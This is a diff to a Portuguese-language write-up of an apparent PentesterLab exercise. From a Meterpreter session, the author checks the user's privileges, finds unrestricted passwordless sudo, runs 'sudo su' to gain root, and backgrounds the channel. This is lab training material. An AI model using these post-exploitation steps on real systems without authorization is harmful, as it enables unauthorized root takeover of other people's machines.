@@ -155,14 +155,41 @@ meterpreter > pwd
 ```
 
 ## Escalando privilégios
+
+Entendendo quem sou e privilégios...
 ```
 meterpreter > getuid
 Server username: pentesterlab
+
+meterpreter > shell
+Process 854 created.
+Channel 5 created.
+
+id
+uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)
+
+sudo -l
+User pentesterlab may run the following commands on this host:
+    (root) NOPASSWD: ALL
+```
+O usuário pentesterlab tem acesso irrestrito ao *sudo* (ALL) e não precisa de senha para acessar (NOPASSWD)
+``` 
+sudo su
+
+whoami 
+root
+```
+Agora temos acesso a conta root da máquina alvo!
+
+Hibernando o canal...
+```
+^Z
+Background channel 5? [y/N]  y
 ```
 ```
-meterpreter > sysinfo
-Computer     : 192.168.1.43
-OS           :  (Linux 3.14.1-pentesterlab)
-Architecture : i686
-BuildTuple   : i486-linux-musl
-Meterpreter  : x86/linux
+meterpreter > channel -l
+
+    Id  Class  Type
+    --  -----  ----
+    5   3      stdapi_process
+```
